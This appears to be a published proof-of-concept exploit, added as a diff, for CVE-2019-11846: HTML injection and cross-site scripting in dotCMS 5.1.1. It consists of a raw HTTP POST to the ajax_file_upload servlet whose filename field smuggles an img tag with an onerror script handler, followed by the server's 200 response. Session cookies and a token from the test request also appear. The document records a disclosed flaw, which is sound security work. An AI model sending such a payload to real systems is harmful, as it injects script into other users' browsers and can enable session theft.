@@ -1,0 +1,37 @@
+# Exploit Title: dotCMS 5.1.1 - HTML Injection
+# Date: 2019-05-09 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://dotcms.com/
+# Software Link: https://github.com/dotCMS
+# Software: dotCMS
+# Product Version: 5.1.1
+# Vulernability Type: Code Injection
+# Vulenrability: HTML Injection and Cross-site Scripting
+# CVE: CVE-2019-11846
+
+# HTTP POST Request :
+
+POST /servlets/ajax_file_upload?fieldName=binary3 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://TARGET/c/portal/layout?p_l_id=b7ab5d3c-5ee0-4195-a17e-8f5579d718dd&p_p_id=site-browser&p_p_action=1&p_p_state=maximized&angularCurrentPortlet=site-browser&p_p_mode=view&_site_browser_struts_action=%2Fext%2Fcontentlet%2Fedit_contentlet&_site_browser_cmd=new&selectedStructure=33888b6f-7a8e-4069-b1b6-5c1aa9d0a48d&folder=SYSTEM_FOLDER&referer=/c/portal/layout%3Fp_l_id%3Db7ab5d3c-5ee0-4195-a17e-8f5579d718dd%26p_p_id%3Dsite-browser%26p_p_action%3D0%26p_p_state%3Dmaximized%26angularCurrentPortlet%3Dsite-browser%26p_p_mode%3Dview%26_site_browser_struts_action%3D%252Fext%252Fbrowser%252Fview_browser&in_frame=true&frame=detailFrame&container=true&angularCurrentPortlet=site-browser
+Content-Type: multipart/form-data; boundary=---------------------------5890268631313811380287956669
+Content-Length: 101313
+DNT: 1
+Connection: close
+Cookie: messagesUtk=2366e7c3b5af4c8c93bb11d0c994848a; BACKENDID=172.18.0.3; JSESSIONID=65C16EFBEE5B7176B22083A0CA451F0A.c16f6b7d05d9; hs-messages-hide-welcome-message=true; access_token=eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZGFlZmEzNS0yYmMyLTQ4MTEtOTRjNi0xNGE0OTk4YzFkNDAiLCJpYXQiOjE1NTczOTY0NzYsInVwZGF0ZWRfYXQiOjEyMDQ4MjQ5NjEwMDAsInN1YiI6ImRvdGNtcy5vcmcuMSIsImlzcyI6IjRiNTkyYjIyLTBiMmEtNGI2ZC05NmU4LTdjMzBiMzgzOTM1ZiJ9.F8_L_Cu96pkYcwTl4ex_zfrA-Fk-rqNUz24oCV0gOmc; DWRSESSIONID=EZToDkzmi*mMXCayMxskFA75sGm
+Upgrade-Insecure-Requests: 1
+
+-----------------------------5890268631313811380287956669
+Content-Disposition: form-data; name="binary3FileUpload"; filename="\"><img src=x onerror=alert(\"ismailtasdelen\")> .json"
+Content-Type: application/json
+
+# HTTP Response :
+
+HTTP/1.1 200 
+Content-Length: 0
+Date: Thu, 09 May 2019 10:23:44 GMT
+Connection: close
